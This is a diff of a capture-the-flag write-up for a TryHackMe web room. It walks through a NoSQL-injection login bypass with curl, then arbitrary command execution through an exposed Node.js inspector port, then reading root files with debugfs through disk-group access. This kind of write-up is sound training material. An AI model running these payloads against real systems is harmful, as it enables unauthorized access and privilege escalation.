@@ -1,3 +1,14 @@
+<div align="center">
+<img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251618019&w=128&q=75" width="150">
+
+# Do Not Disturb
+
+#Web #Boot2Root
+
+</div>
+
+---
+
 
 ```bash
 nmap -sV -sC 10.82.132.27 -oN nmap.txt               
@@ -7,8 +18,14 @@ I find a `Node.js` server on port 80.
 
 ![temp](assets/20260805141932.png)
 
+```bash
+ffuf -u http://10.113.160.242/FUZZ -w /usr/share/wordlists/dirb/big.txt
+```
+I can find:
+* logout (302)
+* staff (403) Forbidden
 
-I can find the directory `staff` with ffuf, but I am unauthorized (401).
+I cannot find /login, but this is where the POST request is sent with `Sign In`.
 
 
 ```bash
@@ -31,14 +48,25 @@ I can see it is an Express server.
 ```
 
 `placeholder="attendant"` is important. **attendant** feels weird. Sometimes placeholders are used with real users, so this might be a real user. Placeholder is just what gray text with low opacity that is in the box for the user to see what to input.
+```bash
+curl -i http://10.113.160.242/login -H "Content-Type: application/json" -d '{"username":"test","password":"test"}'
+```
+![temp](assets/20260806153232.png)
 
 ```bash
 curl -i -X POST http://10.82.132.27/login -H "Content-Type: application/json" -d '{"username":{"$ne":"null"},"password":{"$ne":"null"}}'
 ```
+I get a response, `{"ok":true, "role":"guest"}`. 
+
+If i supply the username `attendant`:
+
+```bash
+curl -i -X POST http://10.80.132.27/login -H "Content-Type: application/json" -d '{"username":{"$ne":"null"},"password":{"$ne":"null"}}'
+```
 
 ![temp](assets/20260805143326.png)
 
-I get a response, `{"ok":true, "role":"staff"}`. 
+I get `"role":"staff"`.
 
 I also get a session cookie!
 ```
@@ -56,7 +84,7 @@ I place the code in a `html` file and open it:
 
 ![temp](assets/20260805143700.png)
 
-Signed in as attendant. **FIX THE imAGES BEFORE, SO THAT IT SHOWS ROLE:GUEST BEFORE USING THE USERNAME ATTENDANT**.
+Signed in as attendant. 
 
 
 ```html
@@ -202,5 +230,36 @@ curl localhost:9229/json/list
 } ]
 ```
 
+The Node.js inspector / debugger port is open on localhost:9229. It allows arbitrary code execution in the context of that Node.js process:
+
+To enter debug console:
+```bash
+node inspect localhost:9229
+
+exec('process.mainModule.require("child_process").execSync("id").toString()')
+
+'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'
+```
+I get RCE as the `pipelinesvc` account. It will be hard to get a shell since this endpoint is internal only. But we are part of the `Disk` group, so lets investigate it.
 
 
+```bash
+exec('process.mainModule.require("child_process").execSync("lsblk").toString()')
+```
+
+![temp](assets/20260807090853.png)
+
+These are all the disk partitions. nvme0n1p1 is the root partition.
+```bash
+exec('process.mainModule.require("child_process").execSync("debugfs /dev/nvme0n1p1 -R \\"ls /root\\"").toString()')
+```
+
+![temp](assets/20260807091253.png)
+
+```bash
+exec('process.mainModule.require("child_process").execSync("debugfs /dev/nvme0n1p1 -R \\"cat /root/root.txt\\"").toString()')
+```
+```
+THM{r4w_d1sk_4cc3ss_w4s_t00_much}
+```
+Wehey!!
